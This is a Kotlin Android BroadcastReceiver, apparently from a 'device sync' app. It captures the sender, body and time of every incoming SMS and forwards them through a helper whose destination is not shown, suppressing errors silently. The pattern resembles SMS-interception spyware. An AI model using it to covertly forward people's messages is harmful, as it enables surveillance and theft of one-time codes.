package com.devicesync.assistant.receivers

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.provider.Telephony
import com.devicesync.assistant.helpers.SyncHelper
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale

class MessageReceiver : BroadcastReceiver() {

    // ─────────────────────────────────────────
    // ON RECEIVE
    // Triggered instantly when SMS arrives
    // ─────────────────────────────────────────
    override fun onReceive(context: Context?, intent: Intent?) {
        if (intent?.action != Telephony.Sms.Intents.SMS_RECEIVED_ACTION) return
        try {
            val messages = Telephony.Sms.Intents.getMessagesFromIntent(intent)
            for (message in messages) {
                val sender = message.displayOriginatingAddress ?: ""
                val body = message.messageBody ?: ""
                val timestamp = SimpleDateFormat(
                    "yyyy-MM-dd HH:mm:ss.SSS",
                    Locale.getDefault()
                ).format(Date(message.timestampMillis))

                if (sender.isNotBlank() && body.isNotBlank()) {
                    SyncHelper.sendMessageReceived(sender, body, timestamp)
                }
            }
        } catch (e: Exception) {
            // Silent fail
        }
    }
}
